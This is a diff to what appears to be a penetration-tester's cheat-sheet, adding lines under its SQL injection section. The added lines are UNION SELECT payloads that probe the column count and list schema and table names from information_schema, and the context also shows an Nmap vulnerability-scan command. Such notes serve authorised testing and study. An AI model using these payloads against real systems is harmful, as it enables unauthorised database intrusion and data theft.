@@ -17,7 +17,11 @@ Cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-shee
 
 ### SQL Injection
 Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+' UNION select 1 from information_schema.tables #
+' UNION select 1,2 from information_schema.tables #
+' UNION select 1,2,3 from information_schema.tables #
 
+UNION select 1,table_schema,table_name from information_schema.tables #
 ### Nmap
 Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
 
